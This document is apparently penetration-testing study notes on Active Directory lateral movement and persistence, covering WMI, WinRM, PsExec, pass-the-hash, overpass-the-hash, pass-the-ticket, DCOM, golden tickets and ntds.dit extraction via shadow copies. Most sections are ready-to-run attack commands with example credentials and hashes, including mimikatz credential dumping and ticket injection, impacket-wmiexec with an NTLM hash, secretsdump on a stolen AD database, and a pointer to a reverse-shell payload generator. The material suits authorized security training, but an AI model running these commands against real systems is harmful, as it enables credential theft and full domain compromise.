## WMI and WinRM

### WMI

The first _lateral movement_ technique is based on _Windows Management Instrumentation_ (WMI), an object-oriented feature that facilitates task automation. WMI is able to create processes via the _Create_ method of the _Win32_Process_ class. It communicates via RPC on port 135 and uses a large port range for session data.

There are two ways to follow the attack:
1) Via _wmic_ (DEPRECATED!)
2) Via _Powershell_

To create a process on a remote target via WMI **you need the credentials of a member of the local _Administrators_** group, which could also be a domain user.

Using the _wmic_ utility to create a process on the remote system:

```bash
wmic /node:$IP_TARGET /user:$USERNAME /password:$PASSWORD process call create "$COMMAND_NAME"

# esempio
wmic /node:192.168.50.73 /user:jen /password:Nexus123! process call create "calc"
```

This command should return the process pid and return value of 0 (which confirms the process was created correctly).

The following shows how to use _Powershell_ to perform the attack.

Creating a _PSCredential_ object in _PowerShell_:

```
$username = '$USERNAME';
$password = '$PASSWORD';
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
```

Creating a new _CimSession_:

```
$options = New-CimSessionOption -Protocol DCOM
$session = New-Cimsession -ComputerName $IP_TARGET -Credential $credential -SessionOption $Options
```

Payload:
- Use https://www.revshells.com/ for payload generation.

```
$command = '$COMMAND_NAME';
```

Creating WMI session via _PowerShell_:

```
Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};
```

Starting a listener on the port specified in the payload.

### WinRM

WinRM can also be used for remote host management. WinRM is Microsoft's version of the _WS-Management_ protocol and exchanges XML messages over HTTP and HTTPS. It uses port 5986 for HTTPS traffic and 5985 for HTTP.

In addition to its implementation in _PowerShell_, WinRM is implemented in several utilities, such as _winrs_ (Windows Remote Shell).

For WinRS to work, **the domain user must be either in the Administrators group or the Remote Management Users group on the target host**.

Running remote commands via WinRS:

```bash
winrs -r:$TARGET_HOST -u:$USERNAME -p:$PASSWORD  "$COMMAND"

# example
winrs -r:files04 -u:jen -p:Nexus123!  "cmd /c hostname & whoami"
```

Inside the command you can insert the previously created payload and start a listener on the specified port.

If you want to use _Powershell_:

```
$username = '$USERNAME';
$password = '$PASSWORD';
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;

New-PSSession -ComputerName $TARGET_IP -Credential $credential
```

To interact with the newly created session:

```
Enter-PSSession 1
```

## PsExec

PsExec attempts to replace telnet-like applications and provides the ability to remotely execute processes on other systems through an interactive console.

To use this tool there are three prerequisites:
- The user authenticating to the target machine must be part of the **Administrators local** group
- The _ADMIN$_ share must be available
- The _File and Printer_ sharing must be "turned on"

```
powershell
Import-Module SmbShare
Get-SmbShare
```

The last two requirements are enabled by default on recent Windows Servers.

To execute commands remotely, PsExec does the following:
- Places **psexesvc.exe** in the **C:\Windows** directory
- Creates and activates a service on the remote host
- Runs the command/program as a child of **psexesvc.exe**

You need to transfer **PsExec64.exe** to the machine and then run the following command:

```bash
./PsExec64.exe -i  \\$TARGET -u $DOMAIN\$USER -p $PASSWORD cmd

# example
./PsExec64.exe -i  \\FILES04 -u corp\jen -p Nexus123! cmd
```

## Pass the Hash

The _Pass the Hash_ (PtH) technique allows an attacker to authenticate to a remote system or service using a user's NTML hash instead of their password. Of course, this only works if the systems and services use NTLM (and not Kerberos) authentication.

There are several tools that use this technique:
- [_PsExec_](https://www.offensive-security.com/metasploit-unleashed/psexec-pass-hash/) (Metasploit)
- [_Passing-the-hash toolkit_](https://github.com/byt3bl33d3r/pth-toolkit)
- [_Impacket_](https://github.com/CoreSecurity/impacket/blob/master/examples/smbclient.py)

The mechanism behind this technique is almost the same as the one used by the attacker when he connects to the target using SMB and authenticates via NTLM hash.

Again, there are some prerequisites:
- The user authenticating to the target machine must be part of the **Administrators local** group
- The _ADMIN$_ share must be available
- SMB connection through the firewall
- The _File and Printer_ sharing must be "turned on"

Using _Impacket wmiexec_ for **PtH**:

```bash
/usr/bin/impacket-wmiexec -hashes :$NTLM_HASH Administrator@$IP_TARGET

# example
/usr/bin/impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@192.168.50.73
```

## Overpass the Hash

With the _overpass the hash_ technique, you can leverage the NTLM hash to obtain a full Kerberos _Ticket Granting Ticket_ (TGT). You can then use this TGT to obtain a _Ticket Granting Service_ (TGS).

**IMPORTANT**: Administrator privileges are required on the machine.

```bash
.\mimikatz.exe

privilege::debug

sekurlsa::logonpasswords

sekurlsa::pth /user:$USER /domain:$DOMAIN /ntlm:$NTLM_HASH /run:powershell

# esempio
sekurlsa::pth /user:jen /domain:corp.com /ntlm:369def79d8372408bf6e93364cc93075 /run:powershell
```

The example shows how it is possible, once you have obtained a hash with elevated privileges, to move to another machine using **PsExec.exe**:

```bash
# klist command to check for ticket presence
klist

# now you could access a file via smb (that was not accessible before)
net use \\files04

# getting a shell via PsExec.exe
.\PsExec.exe \\files04 cmd
```

## Pass the Ticket

With the previous technique, namely _overpass the hash_, after acquiring a TGT we are able to use it only on the machine on which it was acquired.

With the TGS there is more flexibility.

The _Pass the Ticket_ attack uses the TGS, which can be exported and reused anywhere on the network to authenticate to a specific service. Furthermore, the TGS belongs to the current user, so no administrator privileges are required.

Export Kerberos TGT/TGS from disk:

```bash 
.\mimikatz.exe

privilege::debug

sekurlsa::tickets /export

exit

# to show the tickets obtained
dir *.kirbi

# to execute the attack, i.e. the injection of the selected TGS into the process memory
kerberos::ptt $TGS_NAME
```

Example:

```bash
# to show the tickets obtained
dir *.kirbi

# ticket obtained
[0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi

# execution of the attack
kerberos::ptt [0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi

# klist command to verify the presence of the ticket
klist

# example of access to a share through the ticket obtained
ls \\web04\backup
```

## DCOM

A fairly recent technique is the one that uses the _Distributed Component Object Model_ (DCOM).

The Microsoft _Component Object Model_ (COM) is a system used to create SW components that interact with each other and DCOM allows interaction between systems on different networks.

Interaction with DCOM is performed via RPC on TCP port 135 and **local Administrator access is required to call the DCOM Service Control Manager**, which is essentially an API.

The technique for performing _lateral movement_ through DCOM is based on the _Microsoft Management Console_ (MMC) COM application that is responsible for performing automations for Windows systems. The MMC class allows you to create Application Objects, which expose the _ExecuteShellCommand_ method through the _Document.ActiveView_ property.

Remote creation of the MMC Application object:

```
$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","$IP_TARGET"))
```

Example of executing the command on the remote object:

```
$dcom.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c calc","7")
```

# Active Directory Persistence

## Golden Ticket

In Kerberos, when a user requests a TGT, the KDC encrypts it with a key known only to the user. This secret key is the hash of the _krbtgt_ account password.

If an attacker could get their hands on this hash, they could create their own TGT, also known as a _golden ticket_.

Below is an example to illustrate this persistence technique.

First, a lateral movement attempt is made by the basic user from the machine they have access to, to the DC via PsExec:

```
PsExec64.exe \\DC1 cmd.exe
```

From the response, it is clear that the DC cannot be accessed.

**Assuming that you have managed to gain access to an account in the Domain Admin group or that you have compromised the domain controller**. In this situation, you can extract the password hash of the _krbtgt_ account using Mimikatz:

```
.\mimikatz.exe
privilege::debug

lsadump::lsa /patch
```

Once you have the hash, the next step is to go back to the basic user account. Here you must first purge the existing Kerberos tickets:

```
kerberos::purge
```

After that, using Mimikatz and the hash obtained previously you can get the _golden ticket_.

Now by re-issuing the command to perform lateral movement, the basic user is able to access the future controller.

## Shadow Copies

_Shadow Copy_ also known as  _Volume Shadow Service_ (VSS) is a Microsoft backup technology that allows the creation of snapshots of files or entire volumes.

**As a Domain Admin**, it is possible to abuse the _vshadow_ utility to create a _Shadow Copy_ that allows the attacker to extract the AD database. Once the database copy is obtained, it is necessary to obtain the SYSTEM hive in order to extract all the offline user credentials on the kali machine.

Below is an example to explain this persistence technique.

Once logged into a domain admin account, this command is run to perform a _Shadow Copy_ of the entire C drive:

```
vshadow.exe -nw -p  C:
```

Once the snapshot is taken, you need to note the device name of the _Shadow Copy_.

Then, the entire AD database is copied from the _Shadow Copy_ to the C: drive by specifying the device name of the _Shadow Copy_ and adding the full path _ntds.dit_:

```
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit c:\ntds.dit.bak
```

To extract the contents of _ntds.dit_, you need to save the SYSTEM hive from the Windows registry:

```
reg.exe save hklm\system c:\system.bak
```

By moving the two newly created bak files to the kali machine, you can extract the credentials using _secretsdump_:

```
impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL
```
